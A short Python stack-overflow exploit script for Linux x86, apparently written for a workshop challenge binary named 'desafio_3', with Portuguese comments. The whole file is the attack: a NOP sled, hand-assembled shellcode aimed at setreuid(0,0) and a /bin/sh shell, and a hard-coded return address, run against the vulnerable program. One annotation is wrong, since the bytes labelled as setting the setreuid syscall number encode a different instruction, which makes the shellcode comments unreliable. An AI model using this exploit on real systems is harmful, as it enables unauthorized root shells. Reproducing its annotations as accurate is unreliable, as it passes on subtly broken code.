#!/usr/bin/env python
#-*- coding: utf-8 -*-

###########################################################
# Title:  Stack Overflow Exploit
# Author: Blindarcher <blindarcher[no SPAM]outlook dot com>
# Arch:   Linux x86 (IA-32)
###########################################################

from struct import pack
from os import system

# NOP sled
NOPs = "\x90" * 60

			 # setreuid(0,0)
shellcode = ("\x31\xdb"              # xor    %ebx,%ebx
    		 "\xf7\xe3"		         # mul    %ebx
    		 "\x89\xd9"              # mov    %ebx,%ecx
    		 "\x31\xc9"              # mov    $0x46,%al
    		 "\xcd\x80"              # int    $0x80
    		 # execve("/bin//sh", 0, 0)
			 "\x52"		             # push   %edx
    		 "\x68\x2f\x2f\x73\x68"  # push   $0x68732f2f
    		 "\x68\x2f\x62\x69\x6e"  # push   $0x6e69622f
    		 "\x89\xe3"              # mov    %esp,%ebx
    		 "\x6a\x0b"              # push   $0xb
    		 "\x58"                  # pop    %eax
    		 "\xcd\x80")             # int    $0x80

# endereço de retorno
RET = pack("<I", 0xbffff2ec) * 10

# exploit
exploit = NOPs + shellcode + RET

# estourando o buffer vulnerável
system("~/TCHELINUX_2013/desafio_3 %s" % exploit)